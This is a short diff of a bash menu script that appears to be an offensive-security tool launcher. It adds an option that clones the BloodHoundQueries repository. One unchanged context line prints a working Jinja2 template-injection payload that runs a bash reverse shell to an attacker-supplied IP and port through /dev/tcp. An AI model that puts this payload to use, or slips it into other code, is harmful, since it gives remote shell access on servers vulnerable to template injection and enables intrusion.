@@ -536,6 +536,9 @@ while true; do
 	echo "PRY"
 	echo -ne " 743. deivid-rodriguez/pry-byebug\n"
 	echo "$SEP"
+	echo "QUERIES"
+	echo -ne " 2253. CompassSecurity/BloodHoundQueries\n"
+	echo "$SEP"
 	echo "RABBITMQ"
 	echo -ne " 989. QKaiser/cottontail\n"
 	echo "$SEP"
@@ -8773,7 +8776,9 @@ while true; do
 				echo "{{config.__class__.__init__.__globals__['os'].popen(\"bash -c 'bash -i >& /dev/tcp/""$MIP""/""$MPRT"" 0>&1'\").read()}}"
 			fi
 		fi
-
+	;;
+	"2253")
+		Clona "CompassSecurity/BloodHoundQueries"
 	;;
 	*)
 		echo "error, invalid choice"
